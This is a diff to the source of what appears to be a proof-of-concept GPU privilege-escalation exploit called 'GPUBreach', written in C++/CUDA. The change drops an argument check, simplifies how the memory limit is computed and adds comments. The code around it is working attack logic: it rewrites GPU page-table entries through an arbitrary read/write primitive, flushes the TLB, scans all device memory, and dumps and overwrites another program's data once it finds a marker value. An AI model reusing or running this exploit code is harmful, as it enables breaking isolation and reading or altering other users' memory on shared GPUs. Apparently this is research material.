@@ -27,12 +27,6 @@ void dump_memory(void* ptr, const std::string& filename) {
 int
 main (int argc, char *argv[])
 {
-  if (argc <= 1)
-  {
-    std::cout << "Not enough arguments.\n";
-    return 0;
-  }
-
   removeFirstNArgs (argc, argv, 1);
   GPUBreachContext ctx = second_PT_region (argc, argv);
   std::cout << "GPU Privilege Escalation Finished, proceeding to setting up environment for dumping user memory..."<< '\n';
@@ -62,27 +56,21 @@ main (int argc, char *argv[])
 
   std::cout << "(Stable Primitive Ready) Starting the specified program"
               << '\n';
-  int status = std::system("nohup ./data_scripts/gpubreach_demo/app > ./results/gpubreach_demo/app.out 2>&1 &");
-
-  size_t total_byte;
-  auto cuda_status = cudaMemGetInfo (nullptr, &total_byte);
-  if (cudaSuccess != cuda_status)
-    {
-      printf ("Error: cudaMemGetInfo fails, %s \n",
-              cudaGetErrorString (cuda_status));
-      exit (1);
-    }
+  std::system("nohup ./data_scripts/gpubreach_demo/app > ./results/gpubreach_demo/app.out 2>&1 &");
 
   // -1GB conservative limit since the last few hundreds of memory in GPU is unreadable.
-  uint64_t memory_limit = total_byte - 1L * GB; 
+  uint64_t memory_limit = get_memory_limit() - 1L * GB; 
   uint64_t it_ptr = NULL_PTE;
   for (uint64_t i = 0; i < memory_limit; i += ALLOC_SIZE)
     {
+      // Iterate through the memory limit. Set prim.arb_rw_ptr to point to it_ptr
       prim.modify(it_ptr);
       prim.flush_tlb();
 
       cudaMemcpyArray(prim.data_device_ptr, (uint8_t*)prim.arb_rw_ptr, ALLOC_SIZE);
       DBG_OUT << i << ' '<< (void*)it_ptr << ' ' << *(void**)prim.data_device_ptr << '\n';
+
+      // Look for deadbeefs, dump it, then modify the value.
       if (*(void**)(prim.data_device_ptr) == (void*)0xdeadbeefabcdabcd)
       {
         std::cout << "Found your page in " << (void*) it_ptr << ", Value: "<< (void*)0xdeadbeefabcdabcd << '\n';
